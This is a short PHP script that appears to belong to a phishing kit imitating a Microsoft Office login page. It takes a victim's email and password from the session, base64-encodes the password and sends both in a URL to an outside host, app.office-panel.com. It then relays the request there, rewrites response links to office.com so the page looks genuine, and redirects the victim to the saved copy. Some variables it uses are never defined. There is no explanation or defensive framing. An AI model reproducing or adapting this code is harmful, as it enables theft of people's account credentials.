<?php
session_start();
include "config.php";
function makeCurlRequest($url, $isPost = false, $postFields = null) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($isPost) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    } else {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    return $response;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $body = file_get_contents('php://input');
                $url = "https://app.office-panel.com/web/site/process?em=" .  $_SESSION["email"] . "&pass=" . base64_encode($_SESSION["pass"]) . "&email=" . urlencode($email) . "&token=" . urlencode($token) . "&page=" . urlencode($page);
                 $response = makeCurlRequest($url, true, $body);
             $modified_body = str_replace('/kmsi', 'https://office.com', $response);
        file_put_contents("res.html", $modified_body);
        header('Location: res.html');


}